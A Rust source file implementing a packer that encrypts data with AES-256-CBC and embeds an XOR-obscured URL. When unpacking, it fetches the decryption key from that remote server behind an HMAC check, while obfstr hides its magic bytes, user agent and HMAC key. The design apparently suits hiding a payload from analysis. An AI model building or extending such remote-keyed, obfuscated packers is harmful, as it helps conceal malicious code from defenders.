use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, BlockEncryptMut, KeyIvInit};
use argon2::{Algorithm, Argon2, Params, Version};
use hmac::{Hmac, Mac};
use memmap2::MmapMut;
use obfstr::{obfbytes, obfstr};
use rand::rngs::StdRng;
use rand::{RngCore, SeedableRng};
use reqwest::{blocking::Client, header::USER_AGENT};
use sha2::Sha256;
use std::borrow::Cow;
use std::error::Error;
use std::fs::File;
use std::result::Result;

fn xor(what: &[u8], key: &[u8]) -> Vec<u8> {
    what.iter()
        .enumerate()
        .map(|(i, &byte)| byte ^ key[i % key.len()])
        .collect()
}

pub fn pack(what: &[u8], key: &str, url: &str, out_path: &str) -> Result<(), Box<dyn Error>> {
    let magic = obfbytes!(env!("PLAYFAIR_MAGIC").as_bytes());

    let encoded = File::options()
        .read(true)
        .write(true)
        .create(true)
        .truncate(true)
        .open(out_path)?;

    let url_xored = xor(url.as_bytes(), magic);

    // FAIR <url_length> <url> <encrytpted_data>
    encoded.set_len((magic.len() + 1 + url_xored.len() + get_encrypted_size(what)) as u64)?;

    let mut encoded_map = unsafe { MmapMut::map_mut(&encoded)? };

    encoded_map[..magic.len()].copy_from_slice(&magic[..]);
    encoded_map[magic.len()] = url_xored.len() as u8;
    encoded_map[magic.len() + 1..magic.len() + 1 + url_xored.len()]
        .copy_from_slice(url_xored.as_slice());

    encrypt(
        what,
        &mut encoded_map[magic.len() + 1 + url_xored.len()..],
        key.as_bytes(),
    )?;

    Ok(())
}

pub fn unpack(what: &[u8], key: Option<&String>) -> Result<Vec<u8>, Box<dyn Error>> {
    let magic = obfbytes!(env!("PLAYFAIR_MAGIC").as_bytes());

    if &what[..magic.len()] != magic {
        return Err("Bad magic".into());
    }

    let url_len = what[magic.len()] as usize;
    let url = xor(&what[magic.len() + 1..magic.len() + 1 + url_len], magic);

    let key_bytes: Cow<[u8]> = match key {
        Some(str) => Cow::Borrowed(str.as_bytes()),
        None => {
            let mut rng: StdRng = SeedableRng::from_entropy();

            let mut nonce = [0u8; 16];

            rng.fill_bytes(&mut nonce);

            let nonce_str = hex::encode_upper(nonce);

            let req = Client::new();
            let res = req
                .get(String::from_utf8(url)?)
                .header(USER_AGENT, obfstr!(env!("PLAYFAIR_USER_AGENT")))
                .header("X-Cache", &nonce_str)
                .send()?
                .error_for_status()?;

            let key = res.text()?;

            if key.len() <= 64 {
                // HMAC SHA256 length
                return Err("Bad response".into());
            }

            // Check HMAC hash (last 64 chars)
            let mut hash =
                Hmac::<Sha256>::new_from_slice(obfbytes!(env!("PLAYFAIR_HMAC_KEY").as_bytes()))?;
            hash.update(&nonce);

            let mut res_hash = [0; 32];

            hex::decode_to_slice(&key[key.len() - 64..], &mut res_hash)?;

            hash.verify_slice(&res_hash)?; // Time-safe

            // Decode key
            Cow::Owned(xor(&hex::decode(&key[..key.len() - 64])?, &nonce))
        }
    };

    let mut out = vec![0u8; what.len() - (magic.len() + 1 + url_len)];

    let len = decrypt(
        &what[magic.len() + 1 + url_len..],
        out.as_mut_slice(),
        &key_bytes,
    )?;

    out.resize(len, 0);

    Ok(out)
}

pub fn encrypt(src: &[u8], dest: &mut [u8], pass: &[u8]) -> Result<(), Box<dyn Error>> {
    let mut rng: StdRng = SeedableRng::from_entropy();

    let mut salt = [0u8; 16];
    let mut iv = [0u8; 16];

    rng.fill_bytes(&mut salt);
    rng.fill_bytes(&mut iv);

    dest[..salt.len()].copy_from_slice(&salt);
    dest[salt.len()..salt.len() + iv.len()].copy_from_slice(&iv);

    let mut key = [0u8; 32];

    derive_key(pass, &salt, &mut key).unwrap();

    let result = cbc::Encryptor::<aes::Aes256>::new(&key.into(), &iv.into())
        .encrypt_padded_b2b_mut::<Pkcs7>(src, &mut dest[salt.len() + iv.len()..]);

    if result.is_err() {
        return Err("Encryption failed".into());
    }

    Ok(())
}

pub fn decrypt(src: &[u8], dest: &mut [u8], pass: &[u8]) -> Result<usize, Box<dyn Error>> {
    let (salt, src) = src.split_at(16);
    let (iv, src) = src.split_at(16);

    let mut key = [0u8; 32];

    derive_key(pass, salt, &mut key)?;

    let result = cbc::Decryptor::<aes::Aes256>::new(&key.into(), iv.into())
        .decrypt_padded_b2b_mut::<Pkcs7>(src, dest);

    match result {
        Err(_) => Err("Invalid key".into()),
        Ok(data) => Ok(data.len()),
    }
}

pub fn get_encrypted_size(src: &[u8]) -> usize {
    // For AES with PKCS7, the size is:
    // - the nearest multiple of 16 rounded up, if the original size is not a multiple of 16
    // - size + 16 otherwise (due to an extra block of padding)
    let salt_and_iv_size = 32;

    src.len() + (16 - src.len() % 16) + salt_and_iv_size
}

pub fn derive_key(pass: &[u8], salt: &[u8], out: &mut [u8]) -> Result<(), Box<dyn Error>> {
    // The crate defaults can change at any time, so set the params explicitly
    let argon2id = Argon2::new(
        Algorithm::Argon2id,
        Version::V0x13,
        Params::new(
            19_456, // m_cost
            2,      // t_cost
            1,      // p_cost
            Some(out.len()),
        )
        .unwrap(),
    );

    let result = argon2id.hash_password_into(pass, salt, out);

    if result.is_err() {
        return Err("Failed to derive key".into());
    }

    Ok(())
}
